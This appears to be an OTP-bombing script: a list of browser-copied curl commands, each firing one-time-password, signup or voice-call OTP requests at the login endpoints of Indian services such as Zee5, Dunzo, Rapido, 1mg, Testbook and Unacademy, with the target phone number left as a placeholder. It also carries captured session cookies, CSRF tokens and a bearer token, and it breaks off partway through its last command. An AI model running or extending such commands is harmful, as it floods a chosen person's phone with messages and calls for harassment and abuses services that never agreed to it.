  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'version_code: 1500' \
  --data-raw 'phone_number=€tor&is_web=3' \
  --compressed

curl 'https://auth.zee5.com/v1/user/sendotp' \
  -H 'Accept: application/json' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H 'Origin: https://www.zee5.com' \
  -H 'Referer: https://www.zee5.com/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-site' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'device_id: 0afpDz7hZuUJl38J9bWD000000000000' \
  -H 'esk: MGFmcER6N2hadVVKbDM4SjliV0QwMDAwMDAwMDAwMDBfX2dCUWFaTGlOZEdOOVVzQ0taYWxvZ2h6OXQ5U3RXTFNEX18xNjc2NzU1NDI1ODI3' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw '{"phoneno":"91€tor"}' \
  --compressed

curl 'https://www.dunzo.com/api/v0/auth/sign-up' \
  -H 'authority: www.dunzo.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json;charset=UTF-8' \
  -H 'cookie: dz_e=YTAzOWIzNjMtNDU2MC00NDI1LWJjMjMtNDU5NTM4NTZkOGEwX3Yx; connect.sid=s%3AJ-kk0fo5a3k_5q21n9c1bP03KbvEqEYm.BnId9YBG52aj3D5X7S4bkTK99V0LgRFjrv7y3kBlfAc; _gcl_au=1.1.280736843.1676728602; _gid=GA1.2.1103936861.1676728602; WZRK_G=438a8b6b3354443d8c4b2533883f6ebf; _fbp=fb.1.1676728602565.1956882044; __cf_bm=bSeV_LBqdbJamEYB6Dcv8XtnyO.sMTiA9B4z9qwWmho-1676762323-0-AQyYz/u5BhdtVYzbIRXt9gsAcnrc5kP7v3IXfwTQ/hEoaEarkiULYPjsqKxBMTD1AR5CrDIy35erR1EfTFwgfxI=; __cfruid=6dbb5c76baae2a6cc72f7216b2b1a1b3aed91b29-1676762323; _gat_UA-74154936-4=1; _ga=GA1.1.563334689.1676728602; _ga_MH9JSX933B=GS1.1.1676762173.2.0.1676762173.0.0.0; WZRK_S_46R-KR9-WZ5Z=%7B%22p%22%3A1%2C%22s%22%3A1676762324%2C%22t%22%3A1676762194%7D' \
  -H 'correlation-id: 4d805880afe211ed8f1797d73bb0a42f' \
  -H 'origin: https://www.dunzo.com' \
  -H 'referer: https://www.dunzo.com/delhi' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'x-app-flavour;' \
  -H 'x-app-type: PWA_WEB' \
  -H 'x-app-version: 2.0.0' \
  -H 'x-csrf-token: MCVoy4ET-I18Jva1CJx9lZyB82ZzZ_KwYEoU' \
  --data-raw '{"phone":"€tor","tos_accepted":true}' \
  --compressed

curl 'https://customer.rapido.bike/api/otp' \
  -H 'authority: customer.rapido.bike' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: max-age=0' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.rapido.bike' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  --data-raw '{"mobile":"€tor"}' \
  --compressed

curl 'https://api.gopaysense.com/users/otp' \
  -H 'authority: api.gopaysense.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.gopaysense.com' \
  -H 'referer: https://www.gopaysense.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"phone":"€tor"}' \
  --compressed

curl 'https://www.medibuddy.in/unified-login/user/register' \
  -H 'authority: www.medibuddy.in' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: _ga=GA1.2.1885740090.1677007469; _gid=GA1.2.30173405.1677007469; _gac_UA-80666149-1=1.1677007469.CjwKCAiA9NGfBhBvEiwAq5vSy6ki9bIzV_TjjY2LbJMUfaTc2OKMcwykevSmFbrDBOXgwQdXovQykRoC1iYQAvD_BwE; _gat=1; _gcl_au=1.1.1090214670.1677007471; _fbp=fb.1.1677007471185.1290031416; WZRK_G=c24b8447a298430b9243d3516d158894; _gcl_aw=GCL.1677007472.CjwKCAiA9NGfBhBvEiwAq5vSy6ki9bIzV_TjjY2LbJMUfaTc2OKMcwykevSmFbrDBOXgwQdXovQykRoC1iYQAvD_BwE; _opt_utmc=SEM%20Brand; WZRK_S_649-47W-Z55Z=%7B%22p%22%3A1%2C%22s%22%3A1677007624%2C%22t%22%3A1677007478%7D' \
  -H 'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMzNjQxNjAiLCJhcCI6IjMyMjU0ODY4NiIsImlkIjoiNWQ0MWQxNDYxZmYwNTQzYSIsInRyIjoiMWEwMDJmZTU4M2E1ODllY2NmYTA3OWIxMDZlZmE3NjAiLCJ0aSI6MTY3NzAwNzQ5MDY3N319' \
  -H 'origin: https://www.medibuddy.in' \
  -H 'referer: https://www.medibuddy.in/?$3p=a_google_adwords&$always_deeplink=false&~ad_set_id=138542912373&~campaign_id=17724937809&~channel=g&~keyword=medibuddy&~placement&gclid=CjwKCAiA9NGfBhBvEiwAq5vSy6ki9bIzV_TjjY2LbJMUfaTc2OKMcwykevSmFbrDBOXgwQdXovQykRoC1iYQAvD_BwE&_branch_match_id=1052940192611150823&utm_source=Google%20AdWords&utm_campaign=SEM%20Brand&utm_medium=paid%20advertising&_branch_referrer=H4sIAAAAAAAAAz2OzW6DMBCEnwaOUAwJoRKqgJCqJWlEklbhZBlsjMGAy59Fnr6QQ6U57M6n2Z1iGET%2FqutDTvtRQ0JonDWVvk2OkRQX6nfpmwIsU7gI0ralnECEZdvhXl1sxCWae4gJEWvKzRHvyQqWgacoq%2BDYcbdYXyimp4DDIimlVhPM0hHjWWONqtghwrAnA2TYNczdxgKOAUzbXEmGaoEYbZ7MtoHlmPbuxXmiAjUN4S5dl4rMayv3%2F7JKM75kglJGgcc85%2Bs99wt%2FCpn0fjfTdd5WzEk%2FHj%2FwVpYJOKafp%2B8c3TJwjk6ZnCsyXetD2u39853KGN%2FbKZ6rSxsYLIm9aQ99Gf4BUc806ToBAAA%3D' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'traceparent: 00-1a002fe583a589eccfa079b106efa760-5d41d1461ff0543a-01' \
  -H 'tracestate: 3364160@nr=0-1-3364160-322548686-5d41d1461ff0543a----1677007490677' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"source":"medibuddy","platform":"medibuddyInWeb","phonenumber":"€tor","screen":"login-page","advertiserId":"1052940192611150823","mbUserId":null}' \
  --compressed


curl 'https://apinew.moglix.com/nodeApi/v1/login/sendOTP' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'Access-Control-Allow-Methods: GET, POST, PUT, DELETE' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Referer;' \
  -H 'x-access-token;' \
  -H 'x-request-id: 9KBqSaqWkg5-odqZr1bAAbpYcJDDtI98' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw '{"phone":"€tor","email":"","type":"p","source":"signup","device":"mobile"}' \
  --compressed
######start

curl 'https://webapi.apollo247.com/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Origin: https://www.apollopharmacy.in' \
  -H 'Referer: https://www.apollopharmacy.in/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'accept: */*' \
  -H 'authorization: Bearer 3d1833da7020e0602165529446587434' \
  -H 'content-type: application/json' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw $'{"operationName":"Login","variables":{"mobileNumber":"+91€tor","loginType":"PATIENT"},"query":"query Login($mobileNumber: String\u0021, $loginType: LOGIN_TYPE\u0021) {\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\\n    status\\n    message\\n    loginId\\n    __typename\\n  }\\n}\\n"}' \
  --compressed



curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
  -H 'authority: unacademy.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: isDarkModeOn=; proxy-user-uid=856546e5_d94d_4c92_b2ea_50601b466977; un_session_id=738747f0_073b_4eb6_b3b7_5f1fbb258522; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; anonymous_session_id=aeaeefcf_bd1f_46e6_848d_0eea5f87a8f8; _gcl_au=1.1.721686470.1676749491; __gtm_referrer=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.1865436011.1676749491; _gat_UA-69016858-2=1; _gat_UA-5306665-19=1; _ga=GA1.2.387904297.1676749491; _fbp=fb.1.1676749491677.513529990; _ga_6JX23YC5TQ=GS1.1.1676749491.1.0.1676749493.0.0.0; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; _uetsid=b7bec9f0afc411edb8fcf3e5b0242a00; _uetvid=bd557650d54211ecab6383e5aece31d2' \
  -H 'origin: https://unacademy.com' \
  -H 'referer: https://unacademy.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-platform: 0' \
  --data-raw '{"phone":"€tor","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' \
  --compressed


curl 'https://www.1mg.com/auth_api/v6/create_token' \
  -H 'authority: www.1mg.com' \
  -H 'accept: application/vnd.healthkartplus.v11+json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: no-cache, no-store, must-revalidate' \
  -H 'content-type: application/json' \
  -H 'cookie: VISITOR-ID=c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979; city=New%20Delhi; abVisitorId=939604; abExperimentShow=false; amoSessionId=34b0afff-b37b-4a23-bedc-b7c34f31585b; _csrf=AKH-us7dH8ukhnXxYddFxMWZ; isLocaleRedirect=false; isLocaleUIChange=false; _fbp=fb.1.1676729831196.2102042321; geolocation=false; session=r0At4uZPUY5KBP9z6oUE9g.HA9GWOAOjYmT0cW7sZaXEhSjNTb1lL41XKlBCewyOKRWlQySDPiHyAaeLFnMlcJZCdD6SoOU26xSUa2_2uTEfm__O-pT2Uii7ZM42LKWHWrdxvhKnd6MThYVg_8l0KvAykGQAwYt975e5Vk0WSIimg.1676729982547.144000000.0adMxuts723a2dhqUDZGfsJ-8K_iEXc6JT3KW1RxMG4; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2FStNdMwED%2BTTV06nDuNVSN5D9n4kk1GEM%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19IBDFLZ9nEAjLNyMBHx%2FyetdQqTST8GcM%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FL%2FJFdNiK5YUutpw0MxOKaIDO1h97n7zk1V%2FJNVf2t8k44kCyEiFov02inrpzQjyeFDbO1VI1scA%3D%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2BfrS%2F1Yq%2BZHCBtJvR9sz4E7nyrWmSfPDKXHrPGCDl%2B9vZI9xcd6FZe; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18x3ztMsZrphb9%2FGq7adtf3%2BnqRhFkOY%2B5aDvSOGj81z4G5WiZXOxCx; rl_user_id=RudderEncrypt%3AU2FsdGVkX19tl15uVdl2F4HTtLqxkVYX5vVc13JJMRGsvBoqQDncUbQDp4lImDK6ng36A0qEasZXD4fsG1roJBtF%2Bu97PxBaE2eHI2hdoGA%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX188%2BNRgVCrrioB2gso0chWwimiNCqv0acq9ZLzFkz2xRjIHAUruKYqloccZeJCOBlY04Fy1p8V9Iw%3D%3D; _uetsid=ef875af0af9611edbd12a720bc1ea225; _uetvid=ef87d4f0af9611ed995c477ccb56e9bb; _gcl_au=1.1.929593392.1676729832; _nv_sess=173339004.1676729983.9qooi8THZDgNOGZnK3IPdwynyi1Mm4kQtfLfQ3S4Xcg7kv8fpE; _nv_uid=173339004.1676729983.3ffe3c1c-7be0-41ad-855d-54d9c1821d4b.1676729983.1676729983.1.0; _nv_utm=173339004.1676729983.1.1.dXRtc3JjPWdvb2dsZXx1dG1jY249KG5vdCBzZXQpfHV0bWNtZD1vcmdhbmljfHV0bWN0cj0obm90IHByb3ZpZGVkKXx1dG1jY3Q9KG5vdCBzZXQpfGdjbGlkPShub3Qgc2V0KQ==; _nv_did=173339004.1676729983.10318094147tavoi; _ga_1HF6RR2VT7=GS1.1.1676729832.1.0.1676729832.0.0.0; _ga_NPGHGVF7FB=GS1.1.1676729832.1.0.1676729832.0.0.0; singular_device_id=523e24ec-85ce-4cc5-8a1d-f053dc51eb6a; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.890613511.1676729832; _gid=GA1.2.976323208.1676729833; _dc_gtm_UA-21820217-6=1; _gat_UA-21820217-6=1; outbrain_cid_fetch=true; shw_13453=1; _nv_banner_x=13453; _nv_hit=173339004.1676729983.cHZpZXc9MXxidmlldz1bIjEzNDUzIl0=; rl_session=RudderEncrypt%3AU2FsdGVkX1%2FVC3m%2FmoqzX17bt9B%2Fc0bmbo82X7X5Lc%2Bfb%2BjGRJRrdFf7OF6hkZaU%2FE60GEATjhBeZclfs9LQKGHWIgdNiociVoDP1l7dHwb%2BTe7rpO3FrGk%2B6oWN%2BVoHXxRxm1%2BNzUWiFi3zOpPG9Q%3D%3D; AWSALBTG=Z/Cvr1JO8zVmPLKL6jkvDltFGYqygKonwBiXLDFNhqiFK9jbIemlamkXahjAVa1rVSiiysuuSUTwetABAhdN8H8kLRWKwce24pTdK8dMNeeY7Q7T0S+4UzPXEG+wDI47guvLcrpYn2KDySepzaAwKq/3/kKIn9q+A3oP3j1LA1fT; AWSALBTGCORS=Z/Cvr1JO8zVmPLKL6jkvDltFGYqygKonwBiXLDFNhqiFK9jbIemlamkXahjAVa1rVSiiysuuSUTwetABAhdN8H8kLRWKwce24pTdK8dMNeeY7Q7T0S+4UzPXEG+wDI47guvLcrpYn2KDySepzaAwKq/3/kKIn9q+A3oP3j1LA1fT' \
  -H 'hkp-platform: Healthkartplus-0.0.1-Desktop' \
  -H 'origin: https://www.1mg.com' \
  -H 'pragma: no-cache' \
  -H 'referer: https://www.1mg.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'visitor-id: c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979' \
  -H 'x-csrf-token: qsV9AIy4-C0GI9ppMcea042GtPQ8WRA6AhlE' \
  -H 'x-html-canrender: True' \
  -H 'x-platform: Desktop-0.0.1' \
  --data-raw '{"number":"€tor","is_corporate_user":false,"is_doctor":false}' \
  --compressed


curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&resend=true' \
  -H 'authority: api.testbook.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://testbook.com' \
  -H 'referer: https://testbook.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
  -H 'x-tb-client: web,1.2' \
  --data-raw '{}' \
  --compressed

curl 'https://api.tendercuts.in/otp/v2/generate/' \
  -H 'authority: api.tendercuts.in' \
  -H 'accept: application/json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.tendercuts.in' \
  -H 'referer: https://www.tendercuts.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"mobile":"€tor","otp_mode":"SIGNUP"}' \
  --compressed




#ll..



curl 'https://api.tendercuts.in/otp/retry/' \
  -H 'authority: api.tendercuts.in' \
  -H 'accept: application/json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.tendercuts.in' \
  -H 'referer: https://www.tendercuts.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"mobile":"€tor","retry_mode":"voice","gateway":null}' \
  --compressed

curl 'https://www.1mg.com/auth_api/v6/create_token' \
  -H 'authority: www.1mg.com' \
  -H 'accept: application/vnd.healthkartplus.v11+json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: no-cache, no-store, must-revalidate' \
  -H 'content-type: application/json' \
  -H 'cookie: VISITOR-ID=c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979; city=New%20Delhi; abVisitorId=939604; abExperimentShow=false; amoSessionId=34b0afff-b37b-4a23-bedc-b7c34f31585b; _csrf=AKH-us7dH8ukhnXxYddFxMWZ; isLocaleRedirect=false; isLocaleUIChange=false; _fbp=fb.1.1676729831196.2102042321; geolocation=false; session=r0At4uZPUY5KBP9z6oUE9g.HA9GWOAOjYmT0cW7sZaXEhSjNTb1lL41XKlBCewyOKRWlQySDPiHyAaeLFnMlcJZCdD6SoOU26xSUa2_2uTEfm__O-pT2Uii7ZM42LKWHWrdxvhKnd6MThYVg_8l0KvAykGQAwYt975e5Vk0WSIimg.1676729982547.144000000.0adMxuts723a2dhqUDZGfsJ-8K_iEXc6JT3KW1RxMG4; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2FStNdMwED%2BTTV06nDuNVSN5D9n4kk1GEM%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19IBDFLZ9nEAjLNyMBHx%2FyetdQqTST8GcM%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FL%2FJFdNiK5YUutpw0MxOKaIDO1h97n7zk1V%2FJNVf2t8k44kCyEiFov02inrpzQjyeFDbO1VI1scA%3D%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2BfrS%2F1Yq%2BZHCBtJvR9sz4E7nyrWmSfPDKXHrPGCDl%2B9vZI9xcd6FZe; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18x3ztMsZrphb9%2FGq7adtf3%2BnqRhFkOY%2B5aDvSOGj81z4G5WiZXOxCx; rl_user_id=RudderEncrypt%3AU2FsdGVkX19tl15uVdl2F4HTtLqxkVYX5vVc13JJMRGsvBoqQDncUbQDp4lImDK6ng36A0qEasZXD4fsG1roJBtF%2Bu97PxBaE2eHI2hdoGA%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX188%2BNRgVCrrioB2gso0chWwimiNCqv0acq9ZLzFkz2xRjIHAUruKYqloccZeJCOBlY04Fy1p8V9Iw%3D%3D; _uetsid=ef875af0af9611edbd12a720bc1ea225; _uetvid=ef87d4f0af9611ed995c477ccb56e9bb; _gcl_au=1.1.929593392.1676729832; _nv_sess=173339004.1676729983.9qooi8THZDgNOGZnK3IPdwynyi1Mm4kQtfLfQ3S4Xcg7kv8fpE; _nv_uid=173339004.1676729983.3ffe3c1c-7be0-41ad-855d-54d9c1821d4b.1676729983.1676729983.1.0; _nv_utm=173339004.1676729983.1.1.dXRtc3JjPWdvb2dsZXx1dG1jY249KG5vdCBzZXQpfHV0bWNtZD1vcmdhbmljfHV0bWN0cj0obm90IHByb3ZpZGVkKXx1dG1jY3Q9KG5vdCBzZXQpfGdjbGlkPShub3Qgc2V0KQ==; _nv_did=173339004.1676729983.10318094147tavoi; _ga_1HF6RR2VT7=GS1.1.1676729832.1.0.1676729832.0.0.0; _ga_NPGHGVF7FB=GS1.1.1676729832.1.0.1676729832.0.0.0; singular_device_id=523e24ec-85ce-4cc5-8a1d-f053dc51eb6a; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.890613511.1676729832; _gid=GA1.2.976323208.1676729833; outbrain_cid_fetch=true; shw_13453=1; _nv_banner_x=13453; _nv_hit=173339004.1676729983.cHZpZXc9MXxidmlldz1bIjEzNDUzIl0=; AWSALBTG=DfsUbEZSlDPrsDYNT67nas897cRWx5/OVAOTdbqmdkLZtCY+2LbrDf+NEyc+CLy89gFBr5xJEfeTgAfBh75i2d8Z5RkUlEqkahbKSXC3qZzMQ+G7Npnww1qSvvMCuQKEwoUzdnXjRw+Ve4v/Js3XhY+S5a9BRyxYwfM6k965C5gJ; AWSALBTGCORS=DfsUbEZSlDPrsDYNT67nas897cRWx5/OVAOTdbqmdkLZtCY+2LbrDf+NEyc+CLy89gFBr5xJEfeTgAfBh75i2d8Z5RkUlEqkahbKSXC3qZzMQ+G7Npnww1qSvvMCuQKEwoUzdnXjRw+Ve4v/Js3XhY+S5a9BRyxYwfM6k965C5gJ; rl_session=RudderEncrypt%3AU2FsdGVkX19k1sKjNkmJ0%2BE2UJNIxhxyg8AG53dzSaIKZi0oI2Gl6DNxg66M5CAzF6LA1o3FmnDKyNgn5AwoTJVjE%2FTWnmtLhtj0Ysr2z%2B%2Bsf%2FSbHvSYHd3VJevNHij9AuM4Slxl388yg2%2BHHb82VA%3D%3D' \
  -H 'hkp-platform: Healthkartplus-0.0.1-Desktop' \
  -H 'origin: https://www.1mg.com' \
  -H 'pragma: no-cache' \
  -H 'referer: https://www.1mg.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'visitor-id: c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979' \
  -H 'x-csrf-token: qsV9AIy4-C0GI9ppMcea042GtPQ8WRA6AhlE' \
  -H 'x-html-canrender: True' \
  -H 'x-platform: Desktop-0.0.1' \
  --data-raw '{"number":"€tor","is_corporate_user":false,"otp_on_call":true}' \
  --compressed


curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&otpSentVia=call&resend=true' \
  -H 'authority: api.testbook.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://testbook.com' \
  -H 'referer: https://testbook.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'sec-ch-ua-platform: "Android"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
  -H 'x-tb-client: web,1.2' \
  --data-raw '{}' \
  --compressed

curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
  -H 'authority: unacademy.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: isDarkModeOn=; proxy-user-uid=856546e5_d94d_4c92_b2ea_50601b466977; un_session_id=738747f0_073b_4eb6_b3b7_5f1fbb258522; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; anonymous_session_id=aeaeefcf_bd1f_46e6_848d_0eea5f87a8f8; _gcl_au=1.1.721686470.1676749491; __gtm_referrer=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.1865436011.1676749491; _ga=GA1.2.387904297.1676749491; _fbp=fb.1.1676749491677.513529990; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; _ga_6JX23YC5TQ=GS1.1.1676749491.1.1.1676749507.0.0.0; _uetsid=b7bec9f0afc411edb8fcf3e5b0242a00; _uetvid=bd557650d54211ecab6383e5aece31d2' \
  -H 'origin: https://unacademy.com' \
  -H 'referer: https://unacademy.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-platform: 0' \
  --data-raw '{"phone":"€tor","country_code":"IN","otp_type":2,"email":"","send_otp":true,"is_un_teach_user":false}' \
  --compressed

curl 'https://webapi.apollo247.com/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Origin: https://www.apollopharmacy.in' \
  -H 'Referer: https://www.apollopharmacy.in/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'accept: */*' \
